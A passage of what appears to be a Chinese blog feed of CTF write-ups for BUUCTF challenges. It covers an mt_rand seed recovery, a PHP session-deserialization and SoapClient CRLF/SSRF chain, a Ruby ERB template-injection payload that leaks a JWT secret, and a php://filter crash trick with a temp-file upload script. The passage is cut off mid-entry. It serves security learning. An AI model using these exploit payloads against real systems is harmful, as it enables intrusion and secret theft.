class="token variable">$len2</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$len1</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token variable">$len2</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$j</span></span> <span class="token interpolation"><span class="token variable">$j</span></span> 0 <span class="token interpolation"><span class="token variable">$len2</span></span> "</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>python版：    </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>s <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>key <span class="token operator">=</span> <span class="token string">'KVQP0LdJKRaV3n9D'</span>m <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> key<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            m <span class="token operator">+=</span> <span class="token string">"&#123;&#125; &#123;&#125; 0 &#123;&#125; "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre></code></pre><p>转换后的结果：      </p><pre><code>36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61      </code></pre><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/bd326a1b-2d71-4537-b51c-fdfe509f1aaa.png" alt="02.png">      </p><p>注意这里的PHP版本为<code>5.2.1 to 7.0.x</code>如果版本不对的话，生成的也不一样。</p><p>重新生成<code>private_key</code>        </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">1775196155</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// genarate public_key </span><span class="token keyword">function</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$strings1</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$public_key</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$public_key</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$public_key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//genarate private_key</span><span class="token keyword">function</span> <span class="token function">private_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$strings2</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$private_key</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$private_key</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$private_key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">private_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></code></pre><p>得到：     </p><pre><code>KVQP0LdJKRaV3n9DXuNhoueCDCGc   </code></pre><p>sql万能公式得到flag：     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/654d7ca9-db67-400a-b992-0afefb8809be.png" alt="03.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>mt_srand</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bestphp&#39;s Revenge</title>
    <link href="/2021/05/06/BUU83/"/>
    <url>/2021/05/06/BUU83/</url>
    
    <content type="html"><![CDATA[<h2 id="Knowledge"><a href="#Knowledge" class="headerlink" title="Knowledge"></a>Knowledge</h2><ul><li>PHP中SESSION反序列化   <ul><li>PHP中的session中的内容是以文件的方式存储的，并不是存于内存中，存储方式由配置项<code>session.save_handler</code>控制，默认文件。</li><li>文件以sess_sessionid进行命名，文件的内容是session值序列化后的内容</li><li>在<code>php.ini</code>中存在三项配置：</li><li><code>session.save_path=&quot;&quot;</code>   –设置session的存储路径     </li><li><code>session.save_handler=&quot;&quot; </code>–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)       </li><li><code>session.serialize_handler   string</code> –定义用来序列化/反序列化的处理器名字。默认是php(5.5.4后改为php_serialize)    </li><li><code>session.serialize_handler</code>存在三种模式   </li><li><code>php_binary</code>—&gt;键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/e340b98b-eff6-43b5-b50a-ab8ee414d4f3.png" alt="03.png">        </li><li><code>php</code>—-&gt;键名+竖线（|）+经过serialize()函数处理过的值</li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/011a6f2d-5c94-46fc-ba17-8758eeb94a48.png" alt="04.png">       </li><li><code>php_serialize</code>—-&gt;经过serialize()函数处理过的值，会将键名和值当作一个数组序列化   </li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/d4410c44-8d12-4db3-a1cc-8502eeb791d0.png" alt="05.png">   </li><li>如果能够改变序列化的模式，比如默认是PHP，将其改为<code>php_serialize</code>，出入序列化前面加上<code>|</code>，这样反序列化时，按默认的<code>php</code>时，传入的序列化就被反序列化了      </li></ul></li></ul><ul><li><p>PHP原生类<code>SoapClient</code>，当其中的<code>__call</code>方法触发时可以发送HTTP和HTTPs请求</p><ul><li><code>public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</code>      </li><li>第一个参数指明是否为<code>wsdl模式</code>     </li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。   </li><li><a href="https://www.anquanke.com/post/id/153065#h2-1">soap</a>    </li></ul></li><li><p><a href="https://www.jianshu.com/p/d4c304dbd0af"><code>CRLF Injection</code></a>       </p><ul><li>简单说就是在请求头中注入<code>\r\n</code>,从而生成新的请求头，或者覆盖原来的请求头，或者注入<code>\r\n\r\n</code>,注入请求（头和体由两个<code>\r\n</code>分割）     </li></ul></li></ul><h2 id="Try-To-Solve"><a href="#Try-To-Solve" class="headerlink" title="Try To Solve"></a>Try To Solve</h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'implode'</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'welcome_to_the_lctf2018'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>一开始，直接一个<code>$_POST</code>没反应过来<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/6b2ec884-06ae-4190-b0fd-89028778c220.png" alt="02.png"></p><p>发现<code>flag.php</code>      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php">only localhost can get flag<span class="token operator">!</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'only localhost can get flag!'</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'LCTF&#123;*************************&#125;'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>only localhost can get flag<span class="token operator">!</span></code></pre></code></pre><p>解题思路：首先可以通过第一个<code>call_user_func</code>覆盖<code>serialize_handler</code>为<code>php_serialize</code>，在name中写入利用<code>soapClient</code>产生的序列化；第二次通过<code>extract</code>覆盖变量<code>b</code>为<code>call_user_func</code>，name为<code>SoapClient</code>，当<code>call_user_func</code>的参数为一个数组时，会把键名当作一个类名，值当作方法；</p><p><code>call_user_func($b, $a);</code>——&gt;<code>call_user_func(call_user_func(array(SoapClient,&#39;welcome_to_the_lctf2018&#39;)))</code>——&gt;<code>SoapClient-&gt;welcome_to_the_lctf2018()</code>—–&gt;没有这个方法，从而调用<code>__call</code>       </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"http://127.0.0.1/flag.php"</span><span class="token punctuation">;</span><span class="token variable">$attack</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'user_agent'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"N0rth3ty\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n"</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'uri'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$attack</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>第一次使用SoapClient类会报错，需要在<code>php.ini</code>中打开<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/3910e692-bdd4-40f7-b076-82fa36305fac.png" alt="01.png"></p><p>传入 </p><pre><code>f=session_start&amp;name=[生成的payload]         POST: serializer_handler=php_serialize</code></pre><p>然后传</p><pre><code>f=extract&amp;name=SoapClienPOST:b=call_user_func   </code></pre><p>来触发类    </p><p>但我这里没成功，试了好几个师傅的都不行        </p><p>算了    </p><p>就当积累知识点吧</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>serialize</tag>
      
      <tag>原生类</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flag Shop</title>
    <link href="/2021/05/04/BUU82/"/>
    <url>/2021/05/04/BUU82/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="|_|-|"></a>|_|-|</h2><p>打开环境</p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/172950/8/7918/21544/60915946Edcb47200/b52ca327067e551d.png" alt="01.png"></p><p>点一下<code>buy flag</code>     </p><p>弹出了<code>&#123;&quot;title&quot;:&quot;error&quot;,&quot;message&quot;:&quot;no enough jkl&quot;&#125;</code>     </p><p>想到了应该是要伪造cookie     </p><p>顺便看看<code>robots.txt</code>，居然有    </p><pre><code>User-agent: *Disallow: /filebak     </code></pre><p><code>/filebak</code>     </p><pre><code>```rubyrequire &#39;sinatra&#39;require &#39;sinatra/cookies&#39;require &#39;sinatra/json&#39;require &#39;jwt&#39;require &#39;securerandom&#39;require &#39;erb&#39;set :public_folder, File.dirname(__FILE__) + &#39;/static&#39;FLAGPRICE = 1000000000000000000000000000ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)configure do  enable :logging  file = File.new(File.dirname(__FILE__) + &#39;/../log/http.log&#39;,&quot;a+&quot;)  file.sync = true  use Rack::CommonLogger, fileendget &quot;/&quot; do  redirect &#39;/shop&#39;, 302endget &quot;/filebak&quot; do  content_type :text  erb IO.binread __FILE__endget &quot;/api/auth&quot; do  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;  cookies[:auth] = authendget &quot;/api/info&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)endget &quot;/shop&quot; do  erb :shopendget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result  endendpost &quot;/shop&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)  else    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)  endenddef islogin  if cookies[:auth].nil? then    redirect to(&#39;/shop&#39;)  endend```   </code></pre><p>虽然看不懂是啥，但看到了jwt     </p><p>cookie应该就是jwt了吧     </p><p>解码一下     </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/181071/5/2256/71195/60915948Eaa5fb2dd/e6380093c94ee610.png" alt="02.png">   </p><p>确实，试着用<code>jwtcrack</code>爆破一下secret      </p><p>爆了一会，感觉爆不出来    </p><p>难道不是这个考点    </p><p>回去看那个源码    </p><p>看不懂     </p><p>还是去看WP吧   </p><hr><p>ruby的ERB模板注入     </p><p>主要的代码    </p><pre><code>```rubyget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result  endend```      </code></pre><p>参数<code>SECRET</code>与真的<code>SECRET</code>匹配，成功则返回flag    </p><p>参数<code>do</code>与<code>name</code>，如果do的值与name的前七位加上<code> is working</code>一样，会弹出<code>&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;</code><br>这里存在模板注入</p><p>REB模板注入的格式<code>&lt;%=7*7%&gt;</code>——-&gt;49      </p><p>然后是ruby中的<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">预定义变量</a>–&gt;<code>$&#39;</code>返回最后一次成功匹配右边的字符串      </p><p>最后一次成功匹配？？？上面那个？？</p><p>构造<code>&lt;%=$&#39;%&gt;</code>正好七位     </p><p>还要hex编码，不知道为什么。。。。。。。       </p><p>payload：<code>/work?SECRET=&amp;name=%3C%25%3D%24%27%25%3E&amp;do=%3C%25%3D%24%27%25%3E%20is%20working</code>     </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/171834/33/7788/70013/60915948Eff3e1215/1de2e42b943ae0db.png" alt="03.png">   </p><p>返回的就是SECRET   </p><p>构造新的jwt    </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/194760/8/1229/73202/60915947E03771f73/f2ef6f29d8c4d0dc.png" alt="04.png"> </p><p>写入cookie     </p><p>flag在返回头的cookie里    </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/180216/2/2292/80981/60915947E137ed448/8c24414f41a9b8de.png" alt="05.png">     </p><p><a href="https://www.anquanke.com/post/id/86867">REB SSTI</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>jwt</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>jwt</tag>
      
      <tag>ruby</tag>
      
      <tag>ERB</tag>
      
      <tag>SSTI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ezinclude</title>
    <link href="/2021/05/01/BUU81/"/>
    <url>/2021/05/01/BUU81/</url>
    
    <content type="html"><![CDATA[<h2 id="【-】"><a href="#【-】" class="headerlink" title="【-+-    -+-】"></a><code>【-+-    -+-】</code></h2><p>进入环境<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/ec2beb98-e0a5-42f4-82d7-a399394609fe.png" alt="01.png">      </p><p>注释中有Hint      </p><p><code>&lt;!--md5($secret.$name)===$pass --&gt;</code>        </p><p>应该是要传入name和pass       </p><p>响应头里有一段hash值       </p><p>当成pass传入，name不传     </p><p><code>?pass=fa25e54758d5d5c1927781a6ede89f8a</code>      </p><p>有跳转，抓包     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/1454b3cd-95be-480e-a3e5-4f6e0ce65151.png" alt="02.png">       </p><p>看一下<code>flflflflag.php</code>     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/2e856e0a-e4e7-42c6-a5cd-3de410a8da3f.png" alt="03.png"></p><p>有include，伪协议读一下源码      </p><p><code>?file=php://filter/read=convert.base64.encode/resource=flflflflag.php</code>       </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/636b976a-82d7-40c9-b96b-5cb660f19217.png" alt="04.png">     </p><p>解码后       </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">           window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"404.html"</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>&lt;><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/data|input|zip/is'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'include($_GET["file"])'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></code></pre><p>感觉也没啥啊       </p><p>接下来利用<code>php://filter/string.strip_tags</code>       </p><p>php7.0的BUG</p><p>payload:<code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code>       </p><p>输入payload后，会导致PHP崩溃清空堆栈重启，如果同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell         </p><p><a href="https://www.cnblogs.com/tr1ple/p/11301743.html">关于php文件操作的几个小trick </a></p><p>上传脚本     </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIOurl<span class="token operator">=</span><span class="token string">'http://e17fbb9d-53e9-44fc-9c60-91d0f4e7e017.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd'</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span>BytesIO<span class="token punctuation">(</span><span class="token string">b"&lt;?php phpinfo(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"YEs"</span><span class="token punctuation">)</span></code></pre></code></pre><p>应该写一句话木马的，但我试了好几次都没成功，<code>phpinfo();</code>都没法执行       </p><p>然后会在<code>dir.php</code>（包含/tmp中的文件）中得到文件名       </p><p><code>array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [4]=&gt; string(9) &quot;phpTwf0sR&quot;</code>      </p><p>包含即可      </p><p><img 